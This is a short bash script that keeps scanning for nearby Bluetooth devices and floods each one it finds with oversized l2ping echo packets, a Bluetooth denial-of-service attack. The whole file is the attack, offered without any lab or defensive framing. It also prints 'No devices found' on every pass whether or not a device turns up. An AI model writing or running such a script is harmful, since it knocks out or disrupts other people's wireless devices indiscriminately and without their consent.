#!/bin/bash

while true; do
    blue_mac=$(hcitool scan | grep -o -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
    echo "No devices found"
    
    if [ -n "$blue_mac" ]; then
        echo "Device $blue_mac found."
        sudo l2ping -s 660 -f "$blue_mac"
        blue_mac=""
    fi
    
done